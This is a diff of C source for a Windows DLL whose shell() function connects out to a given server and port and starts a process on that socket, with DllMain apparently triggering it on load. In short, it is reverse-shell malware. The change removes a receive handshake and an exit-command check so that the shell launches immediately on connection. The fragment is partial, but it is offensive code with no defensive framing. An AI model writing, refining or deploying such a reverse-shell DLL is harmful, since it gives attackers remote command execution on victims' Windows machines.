@@ -41,14 +41,6 @@ int shell(LPWSTR server, unsigned int port) {
     char recvbuf[BUFLEN];
     memset(recvbuf, 0, BUFLEN);
     
-    // Receive the input
-    //* https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
-    if(recv(socket, recvbuf, BUFLEN, 0) <= 0) {
-        closesocket(socket);
-        WSACleanup();
-        return -2;
-    }
-
     // Start shell
     //* https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
     //* https://docs.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings
@@ -65,15 +57,9 @@ int shell(LPWSTR server, unsigned int port) {
     CloseHandle(pinfo.hProcess);
     CloseHandle(pinfo.hThread);
 
-    memset(recvbuf, 0, BUFLEN);
-    if(recv(socket, recvbuf, BUFLEN, 0) <= 0) {
-        closesocket(socket);
-        WSACleanup();
-        return -3;
-    }
-    if(strcmp(recvbuf, "exit\n") == 0) {
-        return 0;
-    }
+    closesocket(socket);
+    WSACleanup();
+    return 0;
 }
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call)
